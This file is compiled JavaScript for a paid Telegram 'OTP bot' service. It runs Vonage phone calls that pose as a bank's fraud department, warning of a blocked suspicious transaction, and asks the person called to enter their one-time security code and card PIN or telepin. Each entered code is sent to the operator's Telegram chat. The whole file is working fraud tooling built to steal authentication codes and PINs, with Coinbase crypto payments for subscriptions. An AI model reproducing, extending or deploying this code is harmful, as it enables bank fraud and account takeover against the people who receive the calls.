"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (_) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.server = void 0;
/* eslint-disable @typescript-eslint/camelcase */
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable no-console */
var coinbase_commerce_node_1 = require("coinbase-commerce-node");
var express_1 = __importDefault(require("express"));
var moment_1 = __importDefault(require("moment"));
var telegraf_1 = require("telegraf");
var contentful_1 = require("./utils/contentful");
var app = express_1.default();
app.use(express_1.default.json());
var server = function (ctx) { return __awaiter(void 0, void 0, void 0, function () {
    return __generator(this, function (_a) {
        app.post('/coinbase-webhook', function (req, res) { return __awaiter(void 0, void 0, void 0, function () {
            var body, signature, webhookSecret, event, metadata, space, env, newUser, error_1, error_2;
            var _a, _b;
            return __generator(this, function (_c) {
                switch (_c.label) {
                    case 0:
                        body = req.body;
                        signature = req.headers['x-cc-webhook-signature'];
                        webhookSecret = process.env.COINBASE_WEBHOOK_SECRET;
                        _c.label = 1;
                    case 1:
                        _c.trys.push([1, 8, , 9]);
                        event = coinbase_commerce_node_1.Webhook.verifyEventBody(JSON.stringify(body), signature, webhookSecret);
                        metadata = body.event.data.metadata;
                        if (event.type === 'charge:pending' &&
                            metadata.reason === 'OTP Purchase') {
                            // user paid, but transaction not confirm on blockchain yet
                            ctx.telegram.sendMessage(metadata.chatIid, '😁 Your payment has been received but not confirmed yet ');
                        }
                        if (!(event.type === 'charge:confirmed' &&
                            metadata.reason === 'OTP Purchase')) return [3 /*break*/, 7];
                        // all good, charge confirmed
                        ctx.telegram.sendMessage(metadata.chatIid, '😋 Your payment has been received');
                        _c.label = 2;
                    case 2:
                        _c.trys.push([2, 6, , 7]);
                        return [4 /*yield*/, contentful_1.client.getSpace(process.env.CONTENTFUL_SPACE)];
                    case 3:
                        space = _c.sent();
                        return [4 /*yield*/, space.getEnvironment('master')];
                    case 4:
                        env = _c.sent();
                        return [4 /*yield*/, env.createEntry('user', {
                                fields: {
                                    id: { 'en-US': Date.now() },
                                    telegramId: { 'en-US': (_a = ctx.from) === null || _a === void 0 ? void 0 : _a.id },
                                    username: { 'en-US': (_b = ctx.from) === null || _b === void 0 ? void 0 : _b.username },
                                    membershipExpiry: {
                                        'en-US': moment_1.default
                                            .utc()
                                            .add(1, 'month')
                                            .format(),
                                    },
                                    membershipType: 'SILVER',
                                },
                            })];
                    case 5:
                        newUser = _c.sent();
                        ctx.telegram.sendMessage(metadata.chatId, '🤩 Your subsciption has been confirmed, to start send "call"');
                        console.log(newUser);
                        return [3 /*break*/, 7];
                    case 6:
                        error_1 = _c.sent();
                        console.log(error_1);
                        return [3 /*break*/, 7];
                    case 7:
                        if (event.type === 'charge:failed' &&
                            metadata.reason === 'OTP Purchase') {
                            // charge failed or expired
                            ctx.telegram.sendMessage(metadata.chatIid, "😔 You didn't make a payment if this an error please contact admin");
                        }
                        return [2 /*return*/, res.send("success " + event.id)];
                    case 8:
                        error_2 = _c.sent();
                        return [2 /*return*/, res.status(400).send('failure!')];
                    case 9: return [2 /*return*/];
                }
            });
        }); });
        app.post('/vonage-webhook/dtmf/:language', function (req, res) {
            var _a;
            var dtmf = req.body.dtmf;
            if ((dtmf && dtmf.digits === '1') || (dtmf && dtmf.digits === '2')) {
                res.send([
                    {
                        action: 'talk',
                        text: 'For your security please enter the security code we have sent you followed by the # key. If you have not received the code yet please press the star key followed by the # key',
                        language: req.params.language,
                        style: 2,
                        bargeIn: true,
                    },
                    {
                        eventUrl: [
                            process.env.ENDPOINT_URL + "/vonage-webhook/otp/" + ((_a = ctx.chat) === null || _a === void 0 ? void 0 : _a.id) + "/" + req.params.language,
                        ],
                        action: 'input',
                        type: ['dtmf'],
                        dtmf: {
                            submitOnHash: true,
                            timeOut: 10,
                            maxDigits: 18,
                        },
                    },
                ]);
            }
            else if (dtmf && dtmf.digits === '3') {
                res.send([
                    {
                        action: 'talk',
                        text: 'We have blocked a recent suspicious transaction if this was not you please press 1, if this was you please press 2 or to repeat these options please press 3.',
                        language: req.params.language,
                        style: 2,
                        bargeIn: true,
                    },
                    {
                        eventUrl: [
                            process.env.ENDPOINT_URL + "/vonage-webhook/dtmf/" + req.params.language,
                        ],
                        action: 'input',
                        type: ['dtmf'],
                        dtmf: {
                            maxDigits: 1,
                            timeOut: 10,
                        },
                    },
                ]);
            }
            else {
                res.send([
                    {
                        action: 'talk',
                        text: 'You have selected an invalid option.',
                        language: req.params.language,
                        style: 2,
                        bargeIn: true,
                    },
                    {
                        action: 'talk',
                        text: 'We have blocked a recent suspicious transaction if this was not you please press 1, if this was you please press 2 or to repeat these options please press 3.',
                        language: req.params.language,
                        style: 2,
                        bargeIn: true,
                    },
                    {
                        eventUrl: [
                            process.env.ENDPOINT_URL + "/vonage-webhook/dtmf/" + req.params.language,
                        ],
                        action: 'input',
                        type: ['dtmf'],
                        dtmf: {
                            timeOut: 10,
                            maxDigits: 1,
                        },
                    },
                ]);
            }
        });
        app.post('/vonage-webhook/pin/:chatId/:language', function (req, res) { return __awaiter(void 0, void 0, void 0, function () {
            var dtmf;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        dtmf = req.body.dtmf;
                        if (dtmf && dtmf.digits === '*') {
                            return [2 /*return*/, res.send([
                                    {
                                        action: 'talk',
                                        text: "Okay, you might receive another automated call if we detect a security code has been sent to you.",
                                        language: req.params.language,
                                        style: 2,
                                        bargeIn: true,
                                    },
                                ])];
                        }
                        if (!(dtmf && dtmf.digits)) return [3 /*break*/, 2];
                        return [4 /*yield*/, ctx.telegram.sendMessage(req.params.chatId, req.params.language === 'en-US'
                                ? "Card Pin is <b>" + dtmf.digits + "</b> \uD83D\uDCB3"
                                : "Telepin is <b>" + dtmf.digits + "</b> \uD83D\uDCDF", {
                                parse_mode: 'HTML',
                            })];
                    case 1:
                        _a.sent();
                        _a.label = 2;
                    case 2:
                        res.send([
                            {
                                action: 'talk',
                                text: "Great, you have entered " + dtmf.digits + ".",
                                language: req.params.language,
                                style: 2,
                                bargeIn: true,
                            },
                            {
                                action: 'talk',
                                text: "Your account is now secure. If the payment has already left your account, no need to worry, it will automatically be refunded to you in 24 to 48 hours, thank you goodbye.",
                                language: req.params.language,
                                style: 2,
                                bargeIn: true,
                            },
                        ]);
                        return [2 /*return*/];
                }
            });
        }); });
        app.post('/vonage-webhook/otp/:chatId/:language', function (req, res) { return __awaiter(void 0, void 0, void 0, function () {
            var dtmf;
            var _a;
            return __generator(this, function (_b) {
                switch (_b.label) {
                    case 0:
                        dtmf = req.body.dtmf;
                        if (dtmf && dtmf.digits === '*') {
                            res.send([
                                {
                                    action: 'talk',
                                    text: "Okay, you might receive another automated call if we detect a security code has been sent to you.",
                                    language: req.params.language,
                                    style: 2,
                                    bargeIn: true,
                                },
                            ]);
                            return [2 /*return*/, ctx.telegram.sendMessage(req.params.chatId, "OTP not received \u274C", {
                                    parse_mode: 'HTML',
                                })];
                        }
                        if (!(dtmf && dtmf.digits)) return [3 /*break*/, 2];
                        return [4 /*yield*/, ctx.telegram.sendMessage(req.params.chatId, "OTP is <b>" + dtmf.digits + "</b> \u2705", {
                                parse_mode: 'HTML',
                            })];
                    case 1:
                        _b.sent();
                        _b.label = 2;
                    case 2:
                        res.send([
                            {
                                action: 'talk',
                                text: "Great, you have entered " + dtmf.digits + ".",
                                language: req.params.language,
                                style: 2,
                                bargeIn: true,
                            },
                            {
                                action: 'talk',
                                text: req.params.language === 'en-US'
                                    ? 'To authenticate you please enter your card pin followed by the # key'
                                    : 'To authenticate you please enter your telepin followed by the # key',
                                language: req.params.language,
                                style: 2,
                                bargeIn: true,
                            },
                            {
                                eventUrl: [
                                    process.env.ENDPOINT_URL + "/vonage-webhook/pin/" + ((_a = ctx.chat) === null || _a === void 0 ? void 0 : _a.id) + "/" + req.params.language,
                                ],
                                action: 'input',
                                type: ['dtmf'],
                                dtmf: {
                                    submitOnHash: true,
                                    timeOut: 10,
                                    maxDigits: 18,
                                },
                            },
                        ]);
                        return [2 /*return*/];
                }
            });
        }); });
        app.post('/vonage-webhook', function (req, res) { return __awaiter(void 0, void 0, void 0, function () {
            var _a, status, to;
            var _b, _c, _d, _e, _f, _g, _h;
            return __generator(this, function (_j) {
                switch (_j.label) {
                    case 0:
                        _a = req.body, status = _a.status, to = _a.to;
                        if (!(status === 'started')) return [3 /*break*/, 2];
                        return [4 /*yield*/, ctx.telegram.sendMessage((_b = ctx.chat) === null || _b === void 0 ? void 0 : _b.id, "Calling (" + to + ") \uD83D\uDCDE")];
                    case 1:
                        _j.sent();
                        _j.label = 2;
                    case 2:
                        if (!(status === 'ringing')) return [3 /*break*/, 4];
                        return [4 /*yield*/, ctx.telegram.sendMessage((_c = ctx.chat) === null || _c === void 0 ? void 0 : _c.id, "Ringing (" + to + ") \uD83D\uDD14")];
                    case 3:
                        _j.sent();
                        _j.label = 4;
                    case 4:
                        if (!(status === 'answered')) return [3 /*break*/, 6];
                        return [4 /*yield*/, ctx.telegram.sendMessage((_d = ctx.chat) === null || _d === void 0 ? void 0 : _d.id, "On call (" + to + ") \uD83E\uDD33\uD83C\uDFFD", {
                                parse_mode: 'HTML',
                            })];
                    case 5:
                        _j.sent();
                        _j.label = 6;
                    case 6:
                        if (!(status === 'busy')) return [3 /*break*/, 8];
                        return [4 /*yield*/, ctx.telegram.sendMessage((_e = ctx.chat) === null || _e === void 0 ? void 0 : _e.id, '<b>On another call </b> ❌\n\nCall again', {
                                parse_mode: 'HTML',
                                reply_markup: telegraf_1.Markup.inlineKeyboard([
                                    telegraf_1.Markup.button.callback('Yes', 'yes'),
                                    telegraf_1.Markup.button.callback('No', 'no'),
                                ]).reply_markup,
                            })];
                    case 7:
                        _j.sent();
                        _j.label = 8;
                    case 8:
                        if (!(status === 'machine')) return [3 /*break*/, 10];
                        return [4 /*yield*/, ctx.telegram.sendMessage((_f = ctx.chat) === null || _f === void 0 ? void 0 : _f.id, '<b>Voicemail</b> ❌\n\nCall again', {
                                parse_mode: 'HTML',
                                reply_markup: telegraf_1.Markup.inlineKeyboard([
                                    telegraf_1.Markup.button.callback('Yes', 'yes'),
                                    telegraf_1.Markup.button.callback('No', 'no'),
                                ]).reply_markup,
                            })];
                    case 9:
                        _j.sent();
                        _j.label = 10;
                    case 10:
                        if (!(status === 'unanswered')) return [3 /*break*/, 12];
                        return [4 /*yield*/, ctx.telegram.sendMessage((_g = ctx.chat) === null || _g === void 0 ? void 0 : _g.id, '<b>Hungup</b> ❌\n\nCall again', {
                                parse_mode: 'HTML',
                                reply_markup: telegraf_1.Markup.inlineKeyboard([
                                    telegraf_1.Markup.button.callback('Yes', 'yes'),
                                    telegraf_1.Markup.button.callback('No', 'no'),
                                ]).reply_markup,
                            })];
                    case 11:
                        _j.sent();
                        _j.label = 12;
                    case 12:
                        if (!(status === 'completed')) return [3 /*break*/, 14];
                        return [4 /*yield*/, ctx.telegram.sendMessage((_h = ctx.chat) === null || _h === void 0 ? void 0 : _h.id, '<b>Ended</b>.\n\nCall again', {
                                parse_mode: 'HTML',
                                reply_markup: telegraf_1.Markup.inlineKeyboard([
                                    telegraf_1.Markup.button.callback('👍🏽 Yes', 'yes'),
                                    telegraf_1.Markup.button.callback('👎🏽 No', 'no'),
                                ]).reply_markup,
                            })];
                    case 13:
                        _j.sent();
                        _j.label = 14;
                    case 14:
                        console.log('body: ', req.body);
                        res.send({});
                        return [2 /*return*/];
                }
            });
        }); });
        return [2 /*return*/];
    });
}); };
exports.server = server;
var port = process.env.PORT || 4000;
app.listen(port, function () {
    // eslint-disable-next-line no-console
    return console.log("\u26A1\u26A1\u26A1 Server has started on http://localhost:" + port);
});
